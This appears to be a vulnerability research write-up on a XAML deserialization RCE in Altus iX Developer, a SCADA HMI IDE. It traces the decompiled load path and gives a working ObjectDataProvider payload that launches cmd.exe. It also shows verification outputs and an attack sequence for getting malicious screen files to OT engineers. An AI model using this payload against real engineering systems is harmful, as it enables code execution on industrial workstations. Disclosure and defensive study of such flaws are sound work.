# Altus iX Developer XAML Deserialization RCE - Technical Analysis

## Overview

Altus iX Developer 2.53.65422 opens a screen file (`.ix`) through `ScreenXamlSerializer.LoadAndDeserialize` -> `IXamlSerializer.Deserialize(XmlDocument)` -> `XamlSerializer.Deserialize` -> `XamlReader.Load`, passing the screen file XML content to the WPF XAML deserializer without type sanitization. An attacker crafts a malicious `.ix` screen file containing an `ObjectDataProvider` (ODP) gadget. `XamlReader.Load` instantiates the ODP and triggers the `set_MethodName` setter -> `InvokeMethodOnInstance` -> `QueryWorker` -> `Process.Start(ProcessStartInfo)`, achieving arbitrary command execution.

## Authentication Boundary

Altus iX Developer is a pure desktop engineering IDE (SCADA HMI engineering software) with no inbound network service:

- No web panel, no listening port, no remote-client protocol server
- No shell open command, no PreviewHandler/ThumbnailHandler, no OLE/DCOM CLSID
- Command-line auto-open exists (`ProjectManager.cs:6089` `OpenProject(service.Filename)`) but requires the user to launch the IDE with a file argument = social engineering

This is a Target B (IDE-class) threat model: exploitation requires a user to open a malicious project/screen file in the IDE. Unauthenticated RCE is not reachable.

## Stage 1: Sink Identification

### Sink: XamlReader.Load (WPF XAML deserializer, no type allowlist)

File: `CommonIde/Neo.ApplicationFramework.Common.Xaml.Serializer/XamlSerializer.cs`

```csharp
// XamlSerializer.cs:294-310  _E000(XmlDocument) - core deserialization
private List<FrameworkElement> _E000(XmlDocument _E000)
{
    List<FrameworkElement> list = new List<FrameworkElement>();
    StringReader stringReader = new StringReader(_E000.InnerXml);   // line 300: take XML inline
    try {
        XmlTextReader xmlTextReader = new XmlTextReader(stringReader);
        try {
            object obj = null;
            try {
                obj = XamlReader.Load(xmlTextReader);   // line 310: SINK - standard WPF API, no type allowlist
            } catch (XamlParseException exception) { ... throw; }
            // ... process returned FrameworkElement list
        } finally { ((IDisposable)xmlTextReader).Dispose(); }
    } finally { ((IDisposable)stringReader).Dispose(); }
    return list;
}
```

`XamlReader.Load` is the standard XAML deserialization API of .NET Framework 4 WPF. It **natively supports arbitrary type instantiation** with no built-in type blacklist/allowlist. This is the classic sink for .NET XAML deserialization RCE.

### Sink call chain: Deserialize(XmlDocument) -> _E000 -> XamlReader.Load

```csharp
// XamlSerializer.cs:260-292  Deserialize(XmlDocument) - protected virtual
protected virtual IList<FrameworkElement> Deserialize(XmlDocument xmlDocument)
{
    if (this.m__E001 != null && UseNamespaces) {
        _E007(xmlDocument);   // namespace handling, NOT type sanitization
    }
    List<FrameworkElement> list = _E000(xmlDocument);   // line 284: -> XamlReader.Load
    DeserializeScriptEvents(list);                      // line 287: post-processing (RCE already triggered)
    return list;
}

// XamlSerializer.cs:1097  IXamlSerializer.Deserialize(XmlDocument) - explicit interface impl
IList<FrameworkElement> IXamlSerializer.Deserialize(XmlDocument _E000)
{
    return Deserialize(_E000);
}
```

`_E007` (line 276) only does namespace handling — **no type blacklist/allowlist** blocks the ODP gadget.

## Stage 2: Source Identification

### Source: user-controlled `.ix` screen file content

File: `ToolsIde/Neo.ApplicationFramework.Tools.ProjectManager/ScreenDesignerProjectItem.cs`

```csharp
// ScreenDesignerProjectItem.cs:8039-8043  _E032 - screen file load entry
private void _E032(string _E000, string _E001)
{
    string xamlFile = Path.Combine(_E000, Path.ChangeExtension(_E001, global::_E0001._E000(179365)));
    new ScreenXamlSerializer(DesignerHost).LoadAndDeserialize(xamlFile);   // line 8042: load screen file
}
```

File: `ToolsIde/Neo.ApplicationFramework.Tools.Screen.ScreenDesign/ScreenXamlSerializer.cs`

```csharp
// ScreenXamlSerializer.cs:465-509  LoadAndDeserialize - screen file load
public void LoadAndDeserialize(string xamlFile)
{
    try {
        XmlReader xmlReader = XmlReader.Create(xamlFile);   // line 470: read .ix file
        ScreenWindow screenWindow = default(ScreenWindow);
        try {
            screenWindow = _E002(xmlReader);   // line 477: -> Deserialize
        } finally { ((IDisposable)xmlReader).Dispose(); }
        // ...
    } catch (XmlException ex) { _E006(ex, xamlFile); }
    catch (XamlParseException ex2) { _E006(ex2, xamlFile); }
}

// ScreenXamlSerializer.cs:511-527  _E002 - call IXamlSerializer.Deserialize
private ScreenWindow _E002(XmlReader _E000)
{
    XmlDocument xmlDocument = _E003(_E000);   // line 513: XmlReader -> XmlDocument (incl. decryption)
    ScreenWindow screenWindow = ((IXamlSerializer)new XamlSerializer(this.m__E001)
    {
        UseNamespaces = ((byte)global::_E0002._E006(1) != 0)
    }).Deserialize(xmlDocument)[global::_E0002._E006(0)] as ScreenWindow;   // line 519: call Deserialize(XmlDocument)
    // ...
    return screenWindow;
}
```

**Data flow**: `.ix` file content (user-controlled) -> `XmlReader.Create(xamlFile)` -> `_E003` (XmlDocument, incl. decryption) -> `IXamlSerializer.Deserialize(xmlDocument)` -> `XamlSerializer.Deserialize` -> `_E000` -> `XamlReader.Load(InnerXml)` -> **arbitrary type instantiation**.

## Stage 3: Data Flow (Attacker-Controlled Points)

The attacker fully controls the XML content of the `.ix` screen file. `_E003` (`ScreenXamlSerializer.cs:529`) reads the file into an `XmlDocument` (possibly with a decryption step, but the decrypted result is still attacker-controlled XML), and `XamlSerializer.Deserialize` passes `xmlDocument.InnerXml` verbatim to `XamlReader.Load`.

**No intermediate sanitization**: `_E007` (namespace handling) does not remove type nodes; `RemoveAttribute` (line 694/1083) only removes design-time `Name`/`Site` attributes, not `ObjectType`/`MethodName`/`MethodParameters`.

## Stage 4: Exploit Construction

### Gadget: ObjectDataProvider (classic .NET XAML deserialization RCE primitive)

`System.Windows.Data.ObjectDataProvider` (PresentationFramework) implements `ISupportInitialize`. Its `set_MethodName` property setter triggers an immediate method invocation:

```
ObjectDataProvider.set_MethodName(string)
  -> InvokeMethodOnInstance()
  -> QueryWorker()
  -> immediately invokes the MethodName method on the ObjectType instance,
     with MethodParameters as arguments
```

Exception stack from manual testing confirmed: `ObjectDataProvider.set_MethodName -> QueryWorker -> InvokeMethodOnInstance -> Process.Start()`.

### Malicious `.ix` screen payload (XAML)

```xml
<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                    xmlns:sys="clr-namespace:System.Diagnostics;assembly=System"
                    ObjectType="{x:Type sys:Process}"
                    MethodName="Start">
  <ObjectDataProvider.MethodParameters>
    <sys:ProcessStartInfo FileName="cmd.exe" Arguments="/c echo XAML_RCE_OK > C:\Users\Public\marker.txt" />
  </ObjectDataProvider.MethodParameters>
</ObjectDataProvider>
```

**Key points**:

- `ObjectType="{x:Type sys:Process}"` — the XAML type system natively handles the `Type` conversion (`{x:Type}` markup extension), bypassing the custom `_E006` string->Type conversion restriction
- `MethodName="Start"` — setting it triggers the `Process.Start(ProcessStartInfo)` static method call
- `MethodParameters` — `ProcessStartInfo` with `FileName=cmd.exe` + `Arguments=/c <cmd>`

### Why ODP and not the custom ObjectSerializer path

iX has two deserializers:

1. **`ObjectSerializer` / `ObjectSerializerCF`** (custom XML serialization) — the scalar branch `_E006(InnerText, typeof(Type))` returns a string for `Type`, and `SetValue(string)` to a Type property fails -> the ODP `ObjectType` is always null -> **this path does not work** (verified with `odp_test2.ix`)
2. **`XamlSerializer` / `XamlReader.Load`** (standard WPF XAML) — the XAML type system natively handles `Type` conversion -> the ODP gadget works fully -> **this path works** (verified with `xaml_rce_test3.exe` + `xaml_ser_test2.exe`)

Screen files use the `XamlSerializer` path (`ScreenXamlSerializer`), so the ODP gadget is usable.

## Stage 5: Dynamic Verification

### Verification 1: direct `XamlReader.Load` + ODP gadget (4/4 payloads succeed)

Test program `xaml_rce_test3.exe` (.NET Framework 4, compiled with csc.exe). Result:

```
=== A: cmd /c echo > redirect ===
  Data = System.Diagnostics.Process (cmd)
=== B: cmd /c type nul ===
  Data = System.Diagnostics.Process (cmd)
=== C: certutil echo ===
  Data = System.Diagnostics.Process (cmd)
=== D: cmd /c echo no space ===
  Data = System.Diagnostics.Process (cmd)
=== MARKERS ===
  mk_a.txt FOUND: XAML_A
  mk_c.txt FOUND: XAML_C
  mk_d.txt FOUND: XAML_D
```

### Verification 2: via the product `IXamlSerializer.Deserialize` interface

Test program `xaml_ser_test2.exe` (uses the product's `IXamlSerializer.Deserialize` interface). Result: marker file created -> RCE confirmed through the product's own deserialization path.

## Complete Attack Sequence

1. **Craft the malicious screen file**: build an `.ix` file containing the `ObjectDataProvider` XAML gadget with the target command
2. **Distribute to the target**: deliver the malicious project/screen file to an OT engineer (social engineering, project sharing, supply chain)
3. **Open in the IDE**: the target opens the project/screen file in Altus iX Developer IDE
4. **Trigger chain**: the IDE load path `ScreenDesignerProjectItem._E032` -> `ScreenXamlSerializer.LoadAndDeserialize` -> `IXamlSerializer.Deserialize` -> `XamlSerializer.Deserialize` -> `_E000` -> `XamlReader.Load` -> `ObjectDataProvider.set_MethodName("Start")` -> `InvokeMethodOnInstance` -> `QueryWorker` -> `Process.Start(ProcessStartInfo)`
5. **Command executes**: the command runs with the current user's privileges (the engineer account)